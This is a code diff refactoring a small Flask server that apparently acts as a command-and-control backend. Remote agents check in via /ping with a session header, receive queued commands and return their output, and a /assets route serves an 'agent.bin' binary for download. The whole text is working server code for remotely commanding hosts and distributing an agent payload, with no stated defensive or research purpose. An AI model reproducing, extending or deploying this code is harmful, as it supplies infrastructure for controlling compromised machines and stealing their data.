@@ -1,6 +1,7 @@
-from flask import Blueprint, request, send_file
-from server.db import save_result, register_agent
 import uuid
+
+from flask import Blueprint, request, send_file
+from db import save_result, register_agent
 
 
 routes = Blueprint("routes", __name__)
@@ -16,30 +17,29 @@ def healthcheck():
 @routes.post("/ping")
 def sync():
     agent_id = request.headers.get("X-Session-Id")
-    cmd = _pending.get(agent_id) 
+
+    if not agent_id:
+        return {"error": "missing X-Session-Id"}, 400
 
     data = request.get_json()
     output = data.get("output")
     info = data.get("info", {})
 
-    if not agent_id:
-        return {"error": "missing X-Session-Id"}, 400
-
     register_agent(agent_id, info)
-    
+
     if output and _sent.get(agent_id):
         save_result(
             agent_id=agent_id,
             task_id=str(uuid.uuid4()),
-            command=_sent.get(agent_id),
-            output=output
+            command=_sent[agent_id],
+            output=output,
         )
         _sent[agent_id] = None
-    
+
+    cmd = _pending.get(agent_id)
     if cmd:
         _pending[agent_id] = None
         _sent[agent_id] = cmd
-
         return {"cmd": cmd}, 200
 
     return {"cmd": None}, 200
@@ -58,7 +58,6 @@ def command():
     return "ok", 200
 
 
-@routes.get("/assets") # what an asset innit
+@routes.get("/assets")
 def serve_bin():
     return send_file("agent.bin", mimetype="application/octet-stream")
-
